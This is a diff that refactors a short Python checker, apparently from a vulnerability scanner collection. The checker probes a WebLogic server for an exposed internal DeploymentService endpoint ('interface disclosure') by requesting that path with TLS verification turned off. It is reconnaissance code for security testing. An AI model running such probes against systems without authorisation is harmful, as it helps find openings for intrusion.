@@ -9,19 +9,13 @@ description: weblogic 接口泄露
 import sys
 import warnings
 import requests
-
-
-class interface_disclosure_BaseVerify:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['weblogic 接口泄露', '', '']
         headers = {
         "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/bea_wls_deployment_internal/DeploymentService"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False, allow_redirects=False)
 
@@ -37,5 +31,5 @@ class interface_disclosure_BaseVerify:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = interface_disclosure_BaseVerify(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
